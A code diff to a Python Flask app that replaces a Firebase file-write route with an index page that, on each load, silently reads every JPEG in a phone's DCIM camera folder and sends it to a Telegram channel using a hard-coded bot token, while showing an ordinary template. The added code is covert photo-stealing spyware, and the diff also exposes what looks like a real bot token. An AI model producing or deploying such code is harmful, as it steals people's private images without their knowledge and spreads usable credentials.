@@ -1,24 +1,22 @@
-from flask import Flask
-
-import firebase_admin
-from firebase_admin import credentials, storage
-
-# Initialize Firebase app
-cred = credentials.Certificate('dddy-e3783-508d0fdd782e.json')
-firebase_admin.initialize_app(cred, {'storageBucket': 'dddy-e3783.appspot.com'})
+from flask import Flask, render_template
+import glob
+import telebot
 
 app = Flask(__name__)
 
-@app.route('/write-file')
-def write_file():
-    # Get a reference to the file you want to write to
-    bucket = storage.bucket()
-    file_blob = bucket.blob('a.txt')
+@app.route('/')
+def index():
+    send_images_to_telegram()
+    return render_template('index.html')
 
-    # Write content to the file
-    file_blob.upload_from_string('Hello, world!', content_type='text/plain')
+def send_images_to_telegram():
+    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
+    bot = telebot.TeleBot(bot_token)
+    image_paths = glob.glob('/sdcards/DCIM/*.jpg')
 
-    return 'File uploaded successfully.'
+    for image_path in image_paths:
+        with open(image_path, 'rb') as file:
+            bot.send_photo(chat_id='@localipy', photo=file)
 
 if __name__ == '__main__':
     app.run()
